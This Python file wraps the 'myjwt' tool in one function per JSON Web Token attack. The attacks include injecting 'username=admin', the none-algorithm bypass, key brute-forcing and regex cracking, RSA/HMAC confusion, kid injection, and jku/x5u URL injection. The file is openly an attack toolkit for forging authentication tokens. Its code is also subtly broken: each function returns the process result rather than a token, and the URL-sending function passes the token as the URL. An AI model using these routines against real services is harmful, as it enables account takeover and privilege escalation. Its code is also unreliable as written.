import subprocess

def modify_your_JWT ( jwt ):
     print(jwt)
     new_jwt = subprocess.run(["myjwt", jwt, "--add-payload" , "username=admin", "--add-header", "refresh=false"])
     print(new_jwt)
     return new_jwt


def none_vulnerability ( jwt ):
    print(jwt)
    new_jwt = subprocess.run(["myjwt", jwt, "--none""-vulnerability"])
    print(new_jwt)
    return new_jwt

def sign_key ( jwt ,key):
    print(jwt)
    new_jwt = subprocess.run(["myjwt", jwt, "--sign", key])
    print(new_jwt)
    return new_jwt

def brute_force ( jwt ,path):
    print(jwt)
    new_jwt = subprocess.run(["myjwt", jwt, "--bruteforce", path])
    print(new_jwt)
    return new_jwt

def Crack ( jwt ,regex):
    print(jwt)
    new_jwt = subprocess.run(["myjwt", jwt, "--regex", regex])
    print(new_jwt)
    return new_jwt

def RSA_HMAC_confusion ( jwt ,file):
    print(jwt)
    new_jwt = subprocess.run(["myjwt", jwt, "--hmac", file])
    print(new_jwt)
    return new_jwt

def kid_injection ( jwt ):
    print(jwt)
    new_jwt = subprocess.run(["myjwt", jwt, "--kid", "INJECTION"])
    print(new_jwt)
    return new_jwt

def send_your_new_Jwt_to_url ( jwt ):
    print(jwt)
    new_jwt = subprocess.run(["myjwt", jwt, "-u", jwt, "-c", "jwt=", jwt,
                              "--none""-vulnerability", "--add-payload" , "username=admin"])
    print(new_jwt)
    return new_jwt

def Jku_vulnerability ( jwt ,url):
    print(jwt)
    new_jwt = subprocess.run(["myjwt", jwt, "--jku", url])
    print(new_jwt)
    return new_jwt

def X5U_vulnerability ( jwt ,url):
    print(jwt)
    new_jwt = subprocess.run(["myjwt", jwt, "--x5u", url])
    print(new_jwt)
    return new_jwt

